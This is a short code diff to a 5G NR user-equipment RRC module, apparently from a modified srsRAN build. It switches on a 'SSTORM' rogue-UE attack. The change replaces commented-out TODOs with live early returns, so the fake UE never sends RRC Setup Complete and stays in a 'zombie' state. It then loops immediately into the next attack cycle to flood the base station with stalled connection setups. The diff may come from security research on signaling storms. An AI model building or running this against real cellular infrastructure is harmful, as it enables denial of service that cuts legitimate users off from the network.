@@ -2276,7 +2276,7 @@ bool rrc_nr::handle_rrc_setup(const rrc_setup_s& setup)
     if (sstorm_rogue_ue_created >= sstorm_max_rogue) {
       srsran::console("[SSTORM] [ROGUE] %d/%d of rogue ue completed\n", sstorm_rogue_ue_created, sstorm_max_rogue);
       sstorm_active = false;
-      // !vi TODO: remove comment and return true;  // not sending RRC Setup Complete (msg5) to stay in "zombie" state
+      return true;  // not sending RRC Setup Complete (msg5) to stay in "zombie" state
     }
 
     srsran::console("[SSTORM] cycle #%d starting without sending msg5....", sstorm_rogue_ue_created + 1);
@@ -2291,7 +2291,7 @@ bool rrc_nr::handle_rrc_setup(const rrc_setup_s& setup)
 
     // immediatel send another cycle
     set_timer_and_run_attack();
-    // !vi TODO: remove comment and return true; // return success but skip msg5 transmission 
+    return true; // return success but skip msg5 transmission 
   }
   // !vi NORMAL UE OP: defer transmission of Setup Complete until PHY reconfiguration has been completed
   if (not conn_setup_proc.launch(
